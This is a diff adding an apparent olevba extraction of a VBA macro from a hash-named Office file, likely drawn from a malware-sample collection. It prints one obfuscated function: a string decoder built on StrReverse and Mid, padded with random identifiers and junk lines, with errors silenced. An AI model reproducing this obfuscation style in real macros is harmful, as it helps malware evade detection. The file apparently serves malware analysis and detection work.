@@ -1,0 +1,20 @@
+Filename     : ./macros/542d20239d0efb44d859d1ca8ae4f695861ede2151faf8a8ed1e4fab5218098e
+OLE stream   : Macros/VBA/dOarasU
+VBA filename : dOarasU.bas
+----------------------------------------
+Attribute VB_Name = "dOarasU"
+Function ytgUBhjkgbksad(ByVal jRLZUBT As String, BbCKRRjlzzMrzW, YYCjGKY)
+On Error Resume Next
+hEqzmPIOAiOTmsGjFPvTbFvYIqD.GAHwraMhXlrUilDQr.SlHrmKwARcJRqv.sIzXQcLjZLTYblpC
+jBXRHOOwBqIjXFvvHpcDtb.HFifSlUPcafkoYvktlaOlC.CGYdUwNwkFXQMZjvKjbjJsUGXMEi.SMtEJjZuIASOcufRHi
+KpPhJVmJlRGHsif.sdMDtJACfJSjzpoPds.dDfjiWWncBtakzcmnufR.oMBADGLwcqiz
+wiQTlbCHjHp = CONudh + StrReverse(jRLZUBT) + VYBmihjVC
+hbnlkNtGUHl = UwbWo + Mid(wiQTlbCHjHp, BbCKRRjlzzMrzW, YYCjGKY) + djfQKrALObduN
+tRzufQLORVWqtbVfYkNY.LwRMiYpXHDoIdHDAjqXiPRJt.zYpjCthopiTjiBsVqKR.iQTSfstpuUupXsjzAoEKHTn
+kTzpfIYGrMmhEXDKAruV.iJqVsVCFHaOcuiLuDKlwnzLFw.dltKPZRkGKHUmnWBjmXFJprQwhIZ.jwkWzsRMzKpK
+bBnjXwZmNYislot.NhRsjZMWzpuFpmbiuzNqdN.JzPSZCdLEXikcXS.CpQliDUwbzzwlaDAzXHsU
+mUUdqhGBzKcZKA.ccFiSqcCfadUikEQ.GvCwQEMnqazpVMPCnXvB.CQKRoDNNXRuuCTPz
+ytgUBhjkgbksad = LXsrbQi + hbnlkNtGUHl + KNNRuNJ
+MDisfcBzaTJDuStA.YLXJVaAjDipzv.DkfqPkFjjVtRIHbSrUNLW.lFqdiMbzMziq
+SPbiPzocCPERs.lnVmkGBwaAlGt.lJtnSCIDPpwLhZ.plLmHqKqNujDToasIGjqtVQz
+End Function
